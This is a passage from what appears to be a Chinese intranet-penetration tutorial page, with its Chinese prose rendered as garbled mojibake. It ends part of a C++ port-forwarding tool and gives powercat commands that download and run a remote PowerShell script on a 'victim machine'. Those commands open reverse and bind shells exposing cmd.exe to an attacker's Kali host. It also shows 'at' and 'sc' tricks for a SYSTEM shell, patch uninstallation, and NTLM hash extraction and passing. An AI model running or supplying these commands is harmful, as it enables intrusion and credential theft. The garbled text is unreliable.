error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">if</span> (client_connect(sock1, hostIp, destionPort) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(sock1);</span><br><span class="line">closesocket(sock2);</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">/*è·³è¿‡è¿™æ¬¡å¾ªç¯*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//æŠŠsockæ¸…é›¶,åŠ å…¥seté›†</span></span><br><span class="line">FD_ZERO(&amp;fd);</span><br><span class="line">FD_SET(sock1, &amp;fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//selectäº‹ä»¶è¯» å†™ å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">if</span> (select(sock1 + <span class="number">1</span>, &amp;fd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//ä¸æ‡‚</span></span><br><span class="line"><span class="keyword">if</span> (errno == WSAEINTR) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//FD_ISSETè¿”å›å€¼&gt;0 è¡¨ç¤ºSETé‡Œçš„å¯è¯»å†™</span></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(sock1, &amp;fd))</span><br><span class="line">&#123;</span><br><span class="line">l = recv(sock1, buffer, <span class="number">20480</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] There is a error...Create a new connection.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Connect OK!    \n[+] xlcTeam congratulations!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">if</span> (client_connect(sock2, slaveIp, slavePort) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(sock1);</span><br><span class="line">closesocket(sock2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (send(sock2, buffer, l, <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send failed.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] All Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">stu_sock.s1 = sock1;</span><br><span class="line">stu_sock.s2 = sock2;</span><br><span class="line"></span><br><span class="line">HANDLEhThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€æŸ¥IPåœ°å€æ ¼å¼æ˜¯å¦æ­£ç¡®</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (INADDR_NONE == inet_addr(str))</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">/*sock*/</span><span class="comment">/*è¿œç¨‹IP*/</span><span class="comment">/*è¿œç¨‹ç«¯å£*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å£°æ˜</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">host</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(host = gethostbyname(server)))<span class="comment">//è·å¾—è¿œç¨‹ä¸»æœºçš„IP</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//   printf(&quot;[-] Gethostbyname(%s) error:%s\n&quot;,server,strerror(errno));</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»™åœ°å€ç»“æ„èµ‹å€¼</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;cliaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr));</span><br><span class="line">cliaddr.sin_family = AF_INET;</span><br><span class="line">cliaddr.sin_port = htons(port);<span class="comment">/*è¿œç¨‹ç«¯å£*/</span></span><br><span class="line">cliaddr.sin_addr = *((struct in_addr*)host-&gt;h_addr);<span class="comment">//host ip</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å»è¿æ¥è¿œç¨‹æ­£åœ¨listençš„ä¸»æœº</span></span><br><span class="line"><span class="keyword">if</span> (connect(sockfd, (struct sockaddr*) &amp; cliaddr, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//        printf(&quot;[-] Connect error.\r\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc v1.0 -Port Transport by Chris &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;      _     _____                    &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;__  _| | __|_   _|__  __ _ _ __ ___  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\\ \\/ / |/ __|| |/ _ \\/ _` | &#x27;_ ` _ \\ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &gt;  &lt;| | (__ | |  __/ (_| | | | | | |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;/_/\\_\\_|\\___||_|\\___|\\__,_|_| |_| |_|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;site:http://sec.xlcteam.com&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;usage: xlc.exe [options]&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;options:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-slave  remoteIp remotePort1  localIp  localPort&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-listen  remotePort1 remotePort2&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;e.g.:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -slave  202.119.225.35 51 192.168.0.11 3389&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -listen 51  33891&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><p>powercatæ˜¯ä¸€æ¬¾psç‰ˆncã€‚å¯ä»¥æœ¬åœ°æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥è¿œç¨‹ä¸‹è½½æ‰§è¡Œ</p><p>é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°è§£é‡Š-1"><a href="#å‚æ•°è§£é‡Š-1" class="headerlink" title="å‚æ•°è§£é‡Š"></a>å‚æ•°è§£é‡Š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-l      ç›‘å¬è¿æ¥                                      [Switch]</span><br><span class="line">-c      è¿æ¥åˆ°ä¾¦å¬å™¨                                   [String]</span><br><span class="line">-p      è¦è¿æ¥æˆ–ç›‘å¬çš„ç«¯å£.                             [String]</span><br><span class="line">-e      æ‰§è¡Œ. (GAPING_SECURITY_HOLE)                  [String]</span><br><span class="line">-ep     æ‰§è¡ŒPowershell                                [Switch]</span><br><span class="line">-r      ä¸­ç»§,æ ¼å¼: &quot;-r tcp:10.1.1.1:443&quot;               [String]</span><br><span class="line">-u      é€šè¿‡UDPä¼ è¾“æ•°æ®                                 [Switch]</span><br><span class="line">-dns    é€šè¿‡dnsä¼ è¾“æ•°æ® (dnscat2)                       [String]</span><br><span class="line">-dnsft  DNSæ•…éšœé˜ˆå€¼                                     [int32]</span><br><span class="line">-t      è¶…æ—¶é€‰é¡¹, é»˜è®¤å€¼: 60                             [int32]</span><br><span class="line">-i      è¾“å…¥ï¼šæ–‡ä»¶è·¯å¾„ï¼ˆå­—ç¬¦ä¸²ï¼‰,å­—èŠ‚æ•°ç»„æˆ–å­—ç¬¦ä¸²            [object]</span><br><span class="line">-o      æ§åˆ¶å°è¾“å‡ºç±»å‹: &quot;Host&quot;, &quot;Bytes&quot;, or &quot;String&quot;     [String]</span><br><span class="line">-of     è¾“å‡ºæ–‡ä»¶è·¯å¾„                                     [String]</span><br><span class="line">-d      è¿æ¥åæ–­å¼€è¿æ¥                                   [Switch]</span><br><span class="line">-rep    ä¸­ç»§å™¨,æ–­å¼€è¿æ¥åé‡æ–°å¯åŠ¨                          [Switch]</span><br><span class="line">-g      ç”Ÿæˆæœ‰æ•ˆè½½è·                                     [Switch]</span><br><span class="line">-ge     ç”Ÿæˆç¼–ç çš„æœ‰æ•ˆè½½è·                                [Switch]</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠkaliå½“åšæˆ‘ä»¬VPSæœåŠ¡å™¨</p><h5 id="åå‘é“¾æ¥"><a href="#åå‘é“¾æ¥" class="headerlink" title="åå‘é“¾æ¥"></a>åå‘é“¾æ¥</h5><p>kaliä¸Šé¢è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444 -vv</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/49.png" alt="image-20200801155544855"></p><p>å—å®³è€…æœºå™¨ä¸Šè¿è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//å…ˆå¯¼å…¥è¿™ä¸ªæ¨¡å—æ‰è¡Œä¸ç„¶æœ‰äº›æœºå™¨è¿è¡Œæ˜¯æ²¡æœ‰ä»»ä½•ååº”çš„</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">183.138</span> <span class="literal">-p</span> <span class="number">4444</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/50.png" alt="image-20200801155534168"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥ç”¨ä»£ç†å·¥å…·é“¾æ¥kaliä¸Šçš„4444ç«¯å£è¿›è¡Œä»£ç†è®¿é—®äº†</p><h5 id="æ­£å‘é“¾æ¥"><a href="#æ­£å‘é“¾æ¥" class="headerlink" title="æ­£å‘é“¾æ¥"></a>æ­£å‘é“¾æ¥</h5><p>å—å®³è€…æœºå™¨ä¸Šè¿è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//å…ˆå¯¼å…¥è¿™ä¸ªæ¨¡å—æ‰è¡Œä¸ç„¶æœ‰äº›æœºå™¨è¿è¡Œæ˜¯æ²¡æœ‰ä»»ä½•ååº”çš„</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/51.png" alt="image-20200801155337817"></p><p>kaliä¸Šè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.183.145 8888 -vv</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/52.png" alt="image-20200801155352064"></p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤äº†</p><h4 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h4><p>å½“ç›®æ ‡æœºå™¨åªå¼€æ”¾mssqlæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨mssqlæ‰§è¡Œclrä½œä¸ºä¼ è¾“é€šé“ã€‚</p><p>é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blackarrowsec&#x2F;mssqlproxy</span><br></pre></td></tr></table></figure><p>éœ€è¦ç¯å¢ƒå¦‚ä¸‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/53.png" alt="img"></p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>é¦–å…ˆåœ¨Windowsä¸­ï¼Œæƒé™åˆ†ä¸ºå››ç±»</p><table><thead><tr><th align="center"><strong>æƒé™</strong></th><th align="center"><strong>è¯¦ç»†</strong></th></tr></thead><tbody><tr><td align="center">User</td><td align="center">æ™®é€šç”¨æˆ·æƒé™</td></tr><tr><td align="center">Administrator</td><td align="center">ç®¡ç†å‘˜æƒé™ã€‚é€šå¸¸éœ€è¦é€šè¿‡æœºåˆ¶å†æå‡ä¸ºsystemæƒé™æ¥æ“ä½œSAMï¼ˆMimikatzæŠ“å¯†ç ï¼‰</td></tr><tr><td align="center">System</td><td align="center">ç³»ç»Ÿæƒé™ã€‚å¯ä»¥æ“ä½œSAMï¼Œéœ€è¦ä»Administratoræå‡åˆ°SAMæ‰èƒ½å¯¹æ•£åˆ—å€¼Dump</td></tr><tr><td align="center">TrustedInstaller</td><td align="center">æœ€é«˜æƒé™ï¼Œå¯ä»¥æ“ä½œç³»ç»Ÿæ–‡ä»¶</td></tr></tbody></table><p>åˆ©ç”¨kbç¼–å·æŸ¥è¯¢ç›¸å…³CVEç½‘ç«™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨MSFæŸ¥è¯¢å¯åˆ©ç”¨ææƒæ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥å¸è½½kbè¡¥ä¸</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wusa /uninstall /kb:XXXXXXX</span><br></pre></td></tr></table></figure><h3 id="Administratorææƒåˆ°SYSTEM"><a href="#Administratorææƒåˆ°SYSTEM" class="headerlink" title="Administratorææƒåˆ°SYSTEM"></a>Administratorææƒåˆ°SYSTEM</h3><h4 id="atæœ¬åœ°å‘½ä»¤ææƒ"><a href="#atæœ¬åœ°å‘½ä»¤ææƒ" class="headerlink" title="atæœ¬åœ°å‘½ä»¤ææƒ"></a>atæœ¬åœ°å‘½ä»¤ææƒ</h4><p>é€‚ç”¨äºWindows2000ã€Windows 2003ã€Windows XPè¿™ä¸‰ä¸ªç³»ç»Ÿ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#at æ—¶é—´ å‘½ä»¤</span><br><span class="line">at 20:45 calc.exe</span><br><span class="line">#å¼€å¯äº¤äº’å¼çš„cmd</span><br><span class="line">at 20:45 &#x2F;interactive cmd.exe</span><br></pre></td></tr></table></figure><h4 id="scå‘½ä»¤ææƒ"><a href="#scå‘½ä»¤ææƒ" class="headerlink" title="scå‘½ä»¤ææƒ"></a>scå‘½ä»¤ææƒ</h4><p>é€‚ç”¨äºWindows 7ã€Windows 8ã€Windows Server 03ã€Windows Server  08ã€Windows Server  12ã€Windows Server 16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath&#x3D; &quot;cmd &#x2F;K start&quot; type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure><h3 id="CVEæ¼æ´ææƒ"><a href="#CVEæ¼æ´ææƒ" class="headerlink" title="CVEæ¼æ´ææƒ"></a>CVEæ¼æ´ææƒ</h3><p>å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« ä¸»è¦æ˜¯å†…å®¹å¤ªå¤šäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ascotbe.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;WindowsKernelExploits&#x2F;</span><br></pre></td></tr></table></figure><h2 id="è·å–å¯†ç "><a href="#è·å–å¯†ç " class="headerlink" title="è·å–å¯†ç "></a>è·å–å¯†ç </h2><p>å¯†ç æŠ“å–å·²ç»æˆä¸ºæ¸—é€ä¸­å¿…ä¸å¯å°‘çš„ä¸€é¡¹æŠ€èƒ½ã€‚ä¸€ä¸ªç®¡ç†å‘˜å¾ˆå¯èƒ½ç®¡ç†ç€Nå¤šå°æœºå™¨ï¼Œä½†æ˜¯å¯†ç ä½¿ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªæˆ–è€…æ˜¯æœ‰è§„å¾‹çš„ã€‚å¦‚æœæŠ“åˆ°ä¸€å°æœºå™¨çš„å¯†ç ï¼Œåˆ©ç”¨åŒå¯†ç ç¢°æ’ï¼Œå¾ˆå¯èƒ½è¿™ä¸ªæ¸—é€é¡¹ç›®å°±ç»“æŸäº†ã€‚</p><h3 id="å¯†ç ç»„æˆ"><a href="#å¯†ç ç»„æˆ" class="headerlink" title="å¯†ç ç»„æˆ"></a>å¯†ç ç»„æˆ</h3><p>æˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„hashé•¿è¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>ä»–çš„ç»„æˆå°±æ˜¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:sid:lmhash:ntlmhash</span><br></pre></td></tr></table></figure><p>lmhashçš„åŠ å¯†æµç¨‹å¦‚ä¸‹ï¼š</p><p>1ã€å¯†ç é•¿åº¦é™åˆ¶ä¸º14ä¸ªå­—ç¬¦</p><p>2ã€å¯†ç å…¨éƒ¨è½¬æ¢ä¸ºå¤§å†™</p><p>3ã€å¯†ç è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸è¶³14å­—èŠ‚ç”¨0è¡¥å…¨</p><p>4ã€å¯†ç çš„16è¿›åˆ¶å­—ç¬¦ä¸²è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†</p><p>5ã€å†åˆ†7bitä¸ºä¸€ç»„,æ¯ç»„æœ«å°¾åŠ 0ï¼Œå†ç»„æˆä¸€ç»„</p><p>6ã€ä¸Šæ­¥éª¤å¾—åˆ°çš„äºŒç»„ï¼Œåˆ†åˆ«ä½œä¸ºkey ä¸º <code>KGS!@#$%</code>è¿›è¡ŒDESåŠ å¯†ã€‚</p><p>7ã€å°†åŠ å¯†åçš„ä¸¤ç»„æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ°æœ€ç»ˆLM HASHå€¼ã€‚</p><p>ä¸ºäº†è§£å†³LMåŠ å¯†å’Œèº«ä»½éªŒè¯æ–¹æ¡ˆå›ºæœ‰çš„å®‰å…¨æ¼æ´ï¼ŒMicrosoft äº1993å¹´åœ¨Windows NT 3.1ä¸­å¼•å…¥äº†NTLMv1åè®®(ntlmhash)ã€‚å¯¹äºæ•£åˆ—ï¼ŒNTLMä½¿ç”¨Unicodeæ”¯æŒï¼Œæ›¿æ¢ä¸ºï¼Œä¸éœ€è¦ä»»ä½•å¡«å……æˆ–æˆªæ–­æ“ä½œå³å¯ç®€åŒ–å¯†é’¥ã€‚</p><p>1ã€å…ˆå°†ç”¨æˆ·å¯†ç è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ã€‚</p><p>2ã€å°†åå…­è¿›åˆ¶æ ¼å¼çš„å¯†ç è¿›è¡ŒUnicodeç¼–ç ã€‚</p><p>3ã€ä½¿ç”¨MD4å¯¹Unicodeç¼–ç æ•°æ®è¿›è¡ŒHashè®¡ç®—</p><p>å› ä¸ºåœ¨vistaåä¸å†æ”¯æŒlmhashï¼Œå› æ­¤æŠ“åˆ°çš„hashä¸­çš„lmhashéƒ½æ˜¯<code>aad3b435b51404eeaad3b435b51404ee</code></p><p>åœ¨hashä¼ é€’æ”»å‡»æ—¶ï¼Œå¯ä»¥æ›¿æ¢æˆ0ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸‹ntlmè®¤è¯çš„è¿‡ç¨‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/54.png" alt="img"></p><p>ä»–çš„ç®€è¿°æµç¨‹å¦‚ä¸‹ï¼š</p><p>1ã€å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·è®¤è¯</p><p>2ã€æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œç”Ÿæˆä¸€ä¸ª16ä½çš„éšæœºæ•°(è¿™ä¸ªéšæœºæ•°è¢«ç§°ä¸ºChallenge),æ˜æ–‡å‘é€å›å®¢æˆ·ç«¯ã€‚å¹¶ä½¿ç”¨ç™»å½•ç”¨æˆ·å¯†ç hashåŠ å¯†Challengeï¼Œè·å¾—Challenge1</p><p>3ã€å®¢æˆ·ç«¯æ¥æ”¶åˆ°Challengeåï¼Œä½¿ç”¨ç™»å½•ç”¨æˆ·çš„å¯†ç hashå¯¹ChallengeåŠ å¯†ï¼Œè·å¾—Challenge2(è¿™ä¸ªç»“æœè¢«ç§°ä¸ºresponse)ï¼Œå°†responseå‘é€ç»™æœåŠ¡å™¨</p><p>4ã€æœåŠ¡å™¨æ¥æ”¶å®¢æˆ·ç«¯åŠ å¯†åçš„responseï¼Œæ¯”è¾ƒChallenge1å’Œresponseï¼Œå¦‚æœç›¸åŒï¼ŒéªŒè¯æˆåŠŸã€‚</p><p>ä¸Šè¿°ä¸­çš„responseç±»ä¼¼äºä¸‹é¢è¿™æ ·ï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/55.png" alt="img"></p><p>ä¸Šè¿°ä¸­çš„responseå°±å¯ä»¥ç†è§£ä¸ºnet-ntlmhashï¼Œå› æ­¤ntlmhashæˆ‘ä»¬æ˜¯å¯ä»¥æ‹¿æ¥hashä¼ é€’çš„ï¼Œè€Œnet-ntlmhashä¸å¯ä»¥ï¼Œä½†æ˜¯net-ntlmhashä¹Ÿå¯ä»¥æ‹¿æ¥åšç ´è§£å’Œrelayã€‚</p><h3 id="æœ¬åœ°æå–"><a href="#æœ¬åœ°æå–" class="headerlink" title="æœ¬åœ°æå–"></a>æœ¬åœ°æå–</h3><p>åœ¨windowsä¸Šçš„<strong>C:\Windows\System32\config</strong>ç›®å½•ä¿å­˜ç€å½“å‰ç”¨æˆ·çš„å¯†ç hashã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›¸å…³æ‰‹æ®µè·å–è¯¥hashã€‚</p><p><strong>æå–çš„æ—¶å€™éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ™®é€šæƒé™æ²¡åŠæ³•æå–å‡ºæ¥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span 